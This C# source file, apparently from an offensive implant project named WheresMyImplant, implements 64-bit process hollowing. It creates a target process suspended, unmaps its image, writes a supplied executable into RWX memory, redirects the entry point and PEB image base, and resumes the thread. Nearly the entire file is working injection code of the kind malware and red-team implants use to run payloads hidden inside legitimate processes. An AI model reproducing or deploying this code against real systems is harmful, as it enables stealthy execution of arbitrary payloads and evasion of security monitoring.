using System;
using System.Runtime.InteropServices;

namespace WheresMyImplant
{
    //https://github.com/idan1288/ProcessHollowing32-64/blob/master/ProcessHollowing/ProcessHollowing.c
    //https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp

    class HollowProcess
    {
        protected Winbase._PROCESS_INFORMATION lpProcessInformation;
        IntPtr targetImageBaseAddress;

        protected IntPtr allocatedTargetAddress;

        Byte[] image;
        GCHandle pinnedArray;
        IntPtr imagePtr;
        protected Winnt._IMAGE_DOS_HEADER imageDosHeader;
        protected Winnt._IMAGE_NT_HEADERS64 imageNTHeader;
        Winnt.CONTEXT64 context;

        IntPtr lpThread;

        static Int32 offset1 = sizeof(ushort);
        static Int32 offset2 = sizeof(ushort) + sizeof(ushort) + sizeof(uint) + sizeof(uint) + sizeof(uint) + sizeof(ushort) + sizeof(ushort);
        static Int32 offset3 = sizeof(ushort) + sizeof(byte) + sizeof(byte) + sizeof(byte) + sizeof(byte) + sizeof(uint) + sizeof(uint) + sizeof(uint) + sizeof(uint) + sizeof(uint);

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public HollowProcess()
        {
            lpProcessInformation = new Winbase._PROCESS_INFORMATION();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a suspended process, and then opens a handle to the process
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean CreateSuspendedProcess(String lpApplicationName)
        {
            String lpCommandLine = lpApplicationName;
            Winbase._SECURITY_ATTRIBUTES lpProcessAttributes = new Winbase._SECURITY_ATTRIBUTES();
            Winbase._SECURITY_ATTRIBUTES lpThreadAttributes = new Winbase._SECURITY_ATTRIBUTES();
            Winbase._STARTUPINFO lpStartupInfo = new Winbase._STARTUPINFO();

            if (!kernel32.CreateProcess(
                lpApplicationName,
                lpCommandLine,
                ref lpProcessAttributes,
                ref lpThreadAttributes,
                false,
                Winbase.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref lpStartupInfo,
                out lpProcessInformation
            ))
            {
                return false;
            }

            Console.WriteLine("Started Process: {0}", lpProcessInformation.dwProcessId);
            Console.WriteLine("Started Thread:  {0}", lpProcessInformation.dwThreadId);
            Console.WriteLine("Recieved Handle: 0x{0}", lpProcessInformation.hProcess.ToString("X4"));

            context = new Winnt.CONTEXT64();
            context.ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL;

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context));
            Marshal.StructureToPtr(context, lpContext, false);

            Console.WriteLine("\nGetting Thread Context");
            kernel32.GetThreadContext(lpProcessInformation.hThread, lpContext);

            context = (Winnt.CONTEXT64)Marshal.PtrToStructure(lpContext, typeof(Winnt.CONTEXT64));

            Marshal.FreeHGlobal(lpContext);

            Console.WriteLine("RCX Address: 0x{0}", context.Rcx.ToString("X4"));
            Console.WriteLine("RDX Address: 0x{0}", context.Rdx.ToString("X4"));
            Console.ReadKey();
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the PEB Base Address from NtQueryInformationProcess then reads the PEB
        // to get the image base address
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ReadPEB()
        {
            UInt32 processInformationLength = (UInt32)Marshal.SizeOf(typeof(ntdll._PROCESS_BASIC_INFORMATION));
            IntPtr processInformation = Marshal.AllocHGlobal((Int32)processInformationLength);
            ntdll._PROCESS_BASIC_INFORMATION processBasicInformation;
            try
            {
                UInt32 returnLength = 0;
                Int32 returnStatus = ntdll.NtQueryInformationProcess(
                    lpProcessInformation.hProcess,
                    ntdll.PROCESSINFOCLASS.ProcessBasicInformation,
                    processInformation,
                    processInformationLength,
                    ref returnLength
                );

                if (0 != returnStatus)
                {
                    return false;
                }
                processBasicInformation = (ntdll._PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(ntdll._PROCESS_BASIC_INFORMATION));
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(processInformation);
            }

            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("PEB Base Address:   0x{0}", processBasicInformation.PebBaseAddress.ToString("X4"));
            Winternl.PEB64 peb;
            UInt32 pebSize = (UInt32)Marshal.SizeOf(typeof(Winternl.PEB64));
            IntPtr buffer = Marshal.AllocHGlobal((Int32)pebSize);
            try
            {
                UInt32 returnSize = 0;
                if (!kernel32.ReadProcessMemory64(
                    lpProcessInformation.hProcess, 
                    (UInt64)processBasicInformation.PebBaseAddress.ToInt64(),//context.Rdx 
                    buffer, 
                    (UInt64)pebSize, 
                    ref returnSize))
                {
                    return false;
                }
                peb = (Winternl.PEB64)Marshal.PtrToStructure(buffer, typeof(Winternl.PEB64));
                targetImageBaseAddress = peb.ImageBaseAddress;
                Console.WriteLine("Image Base Address: 0x{0}", targetImageBaseAddress.ToString("X4"));
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the NT Headers from the Image Base Address
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ReadNTHeaders64()
        {
            Int32 nSize = Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64));
            IntPtr buffer = Marshal.AllocHGlobal(nSize);
            UInt32 numberBytesRead = 0;
            try
            {
                if (!kernel32.ReadProcessMemory64(lpProcessInformation.hProcess, (UInt64)targetImageBaseAddress.ToInt64(), buffer, (UInt32)nSize, ref numberBytesRead))
                {
                    return false;
                }
                Winnt._IMAGE_NT_HEADERS64 imageNTHeaders = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(buffer, typeof(Winnt._IMAGE_NT_HEADERS64));
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads in the image to be injected
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ReadSourceImage(String sourceImage)
        {
            String file = System.IO.Path.GetFullPath(sourceImage);
            if (!System.IO.File.Exists(file))
            {
                Console.WriteLine("File Not Found");
                return false;
            }

            image = System.IO.File.ReadAllBytes(file);
            pinnedArray = GCHandle.Alloc(image, GCHandleType.Pinned);
            imagePtr = pinnedArray.AddrOfPinnedObject();

            imageDosHeader = (Winnt._IMAGE_DOS_HEADER)Marshal.PtrToStructure(imagePtr, typeof(Winnt._IMAGE_DOS_HEADER));
            Console.WriteLine("NT Header Offset: {0}", imageDosHeader.e_lfanew);
            
            IntPtr ntHeaderPtr = new IntPtr(imagePtr.ToInt64() + imageDosHeader.e_lfanew);
            imageNTHeader = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS64));

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean RemapImage()
        {
            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("NtUnmapViewOfSection: 0x{0}", targetImageBaseAddress.ToString("X4"));
            UInt32 result = ntdll.NtUnmapViewOfSection(lpProcessInformation.hProcess, targetImageBaseAddress);
            if (0 != result)
            {
                Console.WriteLine("NtUnmapViewOfSection Failed");
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4"));
            //allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, targetImageBaseAddress, imageNTHeader.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
            allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, new IntPtr((Int64)imageNTHeader.OptionalHeader.ImageBase), imageNTHeader.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
            if (IntPtr.Zero == allocatedTargetAddress)
            {
                Console.WriteLine("VirtualAllocEx failed");
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("\nFinding Source Image Base");
            //UInt64 imageBase = (UInt64)Marshal.ReadInt64(imagePtr, (Int32)imageDosHeader.e_lfanew + offset1 + offset2 + offset3);
            Console.WriteLine("Source Image Base: 0x{0}", imageNTHeader.OptionalHeader.ImageBase.ToString("X4"));
  
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(
                lpProcessInformation.hProcess, 
                allocatedTargetAddress, 
                imagePtr, 
                imageNTHeader.OptionalHeader.SizeOfHeaders, 
                ref bytesWritten))
            {
                return false;
            }
            Console.WriteLine("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader.OptionalHeader.SizeOfHeaders);

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < imageNTHeader.FileHeader.NumberOfSections; i++)
            {
                IntPtr offset = new IntPtr(
                    imagePtr.ToInt64() + 
                    imageDosHeader.e_lfanew + 
                    Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64)) + 
                    (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                Winnt._IMAGE_SECTION_HEADER imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));

                Console.WriteLine("Writing Section {0}", new String(imageSectionHeader.Name));
                bytesWritten = 0;
                if (!kernel32.WriteProcessMemory(
                    lpProcessInformation.hProcess, 
                    new IntPtr(allocatedTargetAddress.ToInt64() + imageSectionHeader.VirtualAddress), 
                    new IntPtr(imagePtr.ToInt64() + imageSectionHeader.PointerToRawData), 
                    (UInt32)imageSectionHeader.SizeOfRawData, 
                    ref bytesWritten))
                {
                    return false;
                }
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        // sizeof(CONTEXT) = 1232
        // offsetof(Rdx) = 136
        // offsetof(Rcx) = 128
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ResumeProcess64()
        {
            Console.WriteLine("\nUpdating Thread Context");

            context.Rcx = (UInt64)allocatedTargetAddress.ToInt64() + imageNTHeader.OptionalHeader.AddressOfEntryPoint;
            Console.WriteLine("Updated Entry Point Address: 0x{0}", context.Rcx.ToString("X4"));
            
            //Updates the PEB
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(
                lpProcessInformation.hProcess,
                new IntPtr((long)context.Rdx + 16),
                ref imageNTHeader.OptionalHeader.ImageBase,
                (UInt32)IntPtr.Size,
                ref bytesWritten))
            {
                return false;
            }

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context));
            Marshal.StructureToPtr(context, lpContext, false);
            kernel32.SetThreadContext(lpProcessInformation.hThread, lpContext);

            Console.WriteLine("Resuming Main Thread");
            kernel32.ResumeThread(lpProcessInformation.hThread);

            kernel32.WaitForSingleObject(lpProcessInformation.hProcess, 0xFFFFFFFF);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~HollowProcess()
        {
            pinnedArray.Free();
            kernel32.CloseHandle(lpProcessInformation.hProcess);
            kernel32.CloseHandle(lpProcessInformation.hThread);
        }
    }
}